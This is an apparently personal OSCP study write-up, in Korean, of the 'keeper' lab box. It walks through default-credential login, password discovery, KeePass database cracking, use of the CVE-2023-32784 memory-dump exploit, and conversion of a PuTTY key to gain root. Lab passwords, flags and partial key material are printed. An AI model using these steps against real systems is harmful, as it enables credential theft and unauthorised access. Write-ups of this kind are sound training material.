---
slug: "keeper"
title: "keeper"
date: 2026-07-15
category: "linux"
section: "OSCP"
group: "01_boxes"
tags: []
excerpt: "(진짜 이런 말 하면 안되지만 난 이런게 너무 어려움 이런건 어떻게 연습해야되지? 걍 창많던 적던 하나씩 다 들어가봐야하나?)"
readingTime: 6
---

#### Box: keeper | Linux | Easy
날짜: 2026 07 15
소요시간:

##### Open Ports
22
80
-> etc/hosts등록 해야할듯함 
```
echo "10.129.229.41 tickets.keeper.htb" | sudo tee -a /etc/hosts
```
등록후 default credential `root, password`로 로그인 성공
##### Interesting Services

##### Initial Foothold
벡터:
명령어:
![](assets/images/posts/Pasted%20image%2020260715204650.png)
-> CVE 없음
저기로 들어가서 Edit 들어가면 크레덴셜 (Welcome2023!) 나옴

(진짜 이런 말 하면 안되지만 난 이런게 너무 어려움 이런건 어떻게 연습해야되지? 걍 창많던 적던 하나씩 다 들어가봐야하나?)

```sh
ssh lnorgaard@keeper.htb
> Welcome2023!
```
**user.txt :**  62b1a7af502cc8698496b8727b2914e5

##### Privilege Escalation
벡터:
명령어:
```sh
unzip RT30000.zip
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx
```
-> kdbx 가 나왔음 [[Jeeves]] <- 여기서 했던거

```bash
#이걸로 ssh 열려 있으면 칼리에서 파일 가져올 수 있음
scp lnorgaard@keeper.htb:/home/lnorgaard/passcodes.kdbx ./
>password: Welcome2023!
scp lnorgaard@keeper.htb:/home/lnorgaard/KeePassDumpFull.dmp ./
>password: Welcome2023!

keepass2john passcodes.kdbx > cred.hash

hashcat -m 13400 -a 0 ./cred.hash /usr/share/wordlists/rockyou.txt
```
-> 하루 종일 걸려서 포기함

이 zip 파일 안에 파일이 두개 있었잖슴 `kdbx dump` 검색해보니까 나왔음
[CVE-2023-32784](https://github.com/vdohney/keepass-password-dumper)
이걸 사용해서 dump 안에 있는 pw를 유추해볼 수 있음
![](assets/images/posts/Pasted%20image%2020260715230157.png)
검색해보니까 rødgrød med fløde 이게 마스터 pw인듯함
![](assets/images/posts/Pasted%20image%2020260715230230.png)

```sh
kpcli --kdb=passcodes.kdbx
> passcodes/Network
> show -f 0

#아래가 결과
Title: keeper.htb (Ticketing Server)
Uname: root
 Pass: F4><3K0nd!
  URL: 
Notes: PuTTY-User-Key-File-3: ssh-rsa
       Encryption: none
       Comment: rsa-key-20230519
       Public-Lines: 6
       AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
       8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
	   ...
       LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
       Private-Lines: 14
       AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
       oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
       kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
       ...
       AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
       AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
       NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
       Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```
-> 비밀번호는 의미 없고 puttykey가 있음 이걸 저장, openssh가 사용할 수 있는 형식으로 변경해 줘야함
PuTTY-User-Key 여기 부터가 ppk 파일 형식이라고 함

```sh
#PuTTY-User-Key 부터 붙여넣고
nano secret.ppk

#id_rsa에 넣음
puttygen secret.ppk -O private-openssh -o id_rsa

ssh -i id_rsa root@10.129.229.41
```
-> **root.txt :** 2523f5eb23fac35bdf009144e57caf32


##### Rabbit Hole (막혔던 것)


##### 다음 박스에서 써먹을 것
- 회원 관리 페이지 찾아보기
- 암호에도 cve가 있다
- putty와 openssh는 암호키 양식이 다르다